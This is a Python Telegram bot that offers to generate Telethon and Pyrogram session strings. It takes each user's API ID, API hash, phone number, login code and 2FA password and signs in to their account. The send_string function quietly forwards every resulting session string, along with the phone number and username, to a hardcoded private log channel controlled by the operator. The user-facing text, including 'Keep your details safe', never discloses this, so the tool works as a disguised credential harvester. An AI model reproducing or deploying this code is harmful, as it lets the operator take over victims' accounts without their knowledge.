import os
import telebot
from telebot import types
import asyncio
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded
from flask import Flask
import threading

# === CONFIG ===
API_TOKEN = os.getenv("API_TOKEN")   # <- your bot token here
OWNER_LOG_CHANNEL = -1003007132537  # private channel for logging

CHANNELS = [
    {"id": "-1002727599330", "link": "https://t.me/+0vh-rnEu-nI3NTY9", "name": "Join Channel 1"},
    {"id": "-1003092263501", "link": "https://t.me/+_YD4eFtWhPFhMTNl", "name": "Join Channel 2"}
]

bot = telebot.TeleBot(API_TOKEN, parse_mode="HTML")
user_sessions = {}

# asyncio loop
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# Flask (uptime ping)
app = Flask(__name__)

@app.route("/")
def home():
    return "✅ Bot is running!"

# ========== JOIN CHECK ==========
def is_user_joined(user_id):
    for ch in CHANNELS:
        try:
            member = bot.get_chat_member(ch["id"], user_id)
            if member.status not in ["member", "administrator", "creator"]:
                return False
        except Exception as e:
            print(f"Error checking membership: {e}")
            return False
    return True

# ========== START ==========
@bot.message_handler(commands=["start"])
def start(message):
    user = message.from_user
    if not is_user_joined(user.id):
        show_join_channels(user.id)
        return
    send_main_menu(user.id, user.first_name)

def show_join_channels(chat_id):
    markup = types.InlineKeyboardMarkup()
    for ch in CHANNELS:
        markup.add(types.InlineKeyboardButton(ch["name"], url=ch["link"]))
    markup.add(types.InlineKeyboardButton("✅ Check Join Status", callback_data="joined"))
    bot.send_message(chat_id, "🚀 Please join the required channels to use this bot.", reply_markup=markup)

def send_main_menu(chat_id, name):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("ℹ️ About", callback_data="about"))
    markup.add(types.InlineKeyboardButton("🎯 Create String", callback_data="create"))
    bot.send_message(chat_id, f"👋 Hello <b>{name}</b>,\nI can generate Telegram <b>String Sessions</b> for you.\n\nChoose an option below 👇", reply_markup=markup)

# ========== CALLBACK HANDLER ==========
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user = call.from_user

    if call.data == "joined":
        if is_user_joined(user.id):
            bot.delete_message(call.message.chat.id, call.message.message_id)
            send_main_menu(user.id, user.first_name)
        else:
            bot.answer_callback_query(call.id, "❌ You must join all channels first!")
            show_join_channels(user.id)

    elif call.data == "about":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("⬅️ Back", callback_data="back"))
        bot.edit_message_text("ℹ️ <b>About:</b>\n\nThis bot generates <b>String Sessions</b> for <b>Telethon</b> and <b>Pyrogram</b>.\nKeep your details safe.", call.message.chat.id, call.message.message_id, reply_markup=markup)

    elif call.data == "back":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        send_main_menu(user.id, user.first_name)

    elif call.data == "create":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("⚡ Telethon", callback_data="telethon"))
        markup.add(types.InlineKeyboardButton("🔥 Pyrogram", callback_data="pyrogram"))
        markup.add(types.InlineKeyboardButton("⬅️ Back", callback_data="back"))
        bot.edit_message_text("🎯 Choose the type of string session:", call.message.chat.id, call.message.message_id, reply_markup=markup)

    elif call.data in ["telethon", "pyrogram"]:
        user_sessions[user.id] = {"lib": call.data}
        msg = bot.send_message(user.id, "🔑 Please send your <b>API ID</b>:")
        bot.register_next_step_handler(msg, get_api_id)

# ========== API ID ==========
def get_api_id(message):
    try:
        api_id = int(message.text.strip())
        user_sessions[message.from_user.id]["api_id"] = api_id
        msg = bot.send_message(message.chat.id, "🔑 Now send your <b>API HASH</b>:")
        bot.register_next_step_handler(msg, get_api_hash)
    except ValueError:
        msg = bot.send_message(message.chat.id, "❌ Invalid API ID. Try again:")
        bot.register_next_step_handler(msg, get_api_id)

# ========== API HASH ==========
def get_api_hash(message):
    user_sessions[message.from_user.id]["api_hash"] = message.text.strip()
    msg = bot.send_message(message.chat.id, "📱 Send your <b>Phone Number</b> (+countrycode):")
    bot.register_next_step_handler(msg, get_phone)

# ========== PHONE ==========
def get_phone(message):
    user_sessions[message.from_user.id]["phone"] = message.text.strip()
    user_id = message.from_user.id
    bot.send_message(message.chat.id, "📩 Please wait... sending code to your phone.")
    if user_sessions[user_id]["lib"] == "telethon":
        loop.create_task(telethon_login(user_id))
    else:
        loop.create_task(pyrogram_login(user_id))

# ========== TELETHON LOGIN ==========
async def telethon_login(user_id):
    data = user_sessions[user_id]
    client = TelegramClient(StringSession(), data["api_id"], data["api_hash"])
    await client.connect()
    try:
        # ✅ Force SMS to ensure code is delivered
        sent = await client.send_code_request(data["phone"], force_sms=True)
        user_sessions[user_id]["client"] = client
        user_sessions[user_id]["phone_code_hash"] = sent.phone_code_hash
        msg = bot.send_message(user_id, "✉️ Enter the OTP you received:")
        bot.register_next_step_handler(msg, get_telethon_otp)
    except Exception as e:
        bot.send_message(user_id, f"❌ Error: {e}")
        await client.disconnect()

def get_telethon_otp(message):
    code = message.text.strip().replace(" ", "")
    loop.create_task(complete_telethon_login(message.from_user.id, code))

async def complete_telethon_login(user_id, code):
    data = user_sessions[user_id]
    client = data["client"]
    try:
        await client.sign_in(phone=data["phone"], code=code, phone_code_hash=data["phone_code_hash"])
        string_session = StringSession.save(client.session)
        await client.disconnect()
        send_string(user_id, data, string_session)
    except SessionPasswordNeededError:
        msg = bot.send_message(user_id, "🔒 2FA enabled. Enter your password:")
        bot.register_next_step_handler(msg, get_telethon_password)

def get_telethon_password(message):
    loop.create_task(complete_telethon_with_password(message.from_user.id, message.text.strip()))

async def complete_telethon_with_password(user_id, password):
    data = user_sessions[user_id]
    client = data["client"]
    try:
        await client.sign_in(password=password)
        string_session = StringSession.save(client.session)
        await client.disconnect()
        send_string(user_id, data, string_session)
    except Exception as e:
        bot.send_message(user_id, f"❌ Error: {e}")
        await client.disconnect()

# ========== PYROGRAM LOGIN ==========
async def pyrogram_login(user_id):
    data = user_sessions[user_id]
    client = Client(":memory:", api_id=data["api_id"], api_hash=data["api_hash"])
    await client.connect()
    try:
        # ✅ Use force_sms=True here too
        sent = await client.send_code(data["phone"], force_sms=True)
        user_sessions[user_id]["client"] = client
        user_sessions[user_id]["phone_code_hash"] = sent.phone_code_hash
        msg = bot.send_message(user_id, "✉️ Enter the OTP you received:")
        bot.register_next_step_handler(msg, get_pyrogram_otp)
    except Exception as e:
        bot.send_message(user_id, f"❌ Error: {e}")
        await client.disconnect()

def get_pyrogram_otp(message):
    code = message.text.strip().replace(" ", "")
    loop.create_task(complete_pyrogram_login(message.from_user.id, code))

async def complete_pyrogram_login(user_id, code):
    data = user_sessions[user_id]
    client = data["client"]
    try:
        await client.sign_in(
            phone_number=data["phone"],
            phone_code=code,
            phone_code_hash=data["phone_code_hash"]
        )
        string_session = await client.export_session_string()
        await client.disconnect()
        send_string(user_id, data, string_session)
    except SessionPasswordNeeded:
        msg = bot.send_message(user_id, "🔒 2FA enabled. Enter your password:")
        bot.register_next_step_handler(msg, get_pyrogram_password)

def get_pyrogram_password(message):
    loop.create_task(complete_pyrogram_with_password(message.from_user.id, message.text.strip()))

async def complete_pyrogram_with_password(user_id, password):
    data = user_sessions[user_id]
    client = data["client"]
    try:
        await client.check_password(password=password)
        string_session = await client.export_session_string()
        await client.disconnect()
        send_string(user_id, data, string_session)
    except Exception as e:
        bot.send_message(user_id, f"❌ Error: {e}")
        await client.disconnect()

# ========== SEND STRING ==========
def send_string(chat_id, data, string):
    lib = data["lib"].capitalize()
    username = bot.get_chat(chat_id).username or "NoUsername"
    bot.send_message(chat_id, f"✅ Your <b>{lib}</b> String:\n\n<code>{string}</code>")
    try:
        bot.send_message(
            OWNER_LOG_CHANNEL,
            f"🔔 New {lib} String\n👤 User: @{username}\n🆔 {chat_id}\n📱 Phone: {data['phone']}\n📜 String:\n<code>{string}</code>"
        )
    except Exception as e:
        print(f"Log send fail: {e}")

# === RUN BOT ===
if __name__ == "__main__":
    print("🚀 Bot Started...")
    threading.Thread(target=lambda: loop.run_forever(), daemon=True).start()
    threading.Thread(target=lambda: bot.infinity_polling(), daemon=True).start()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)))
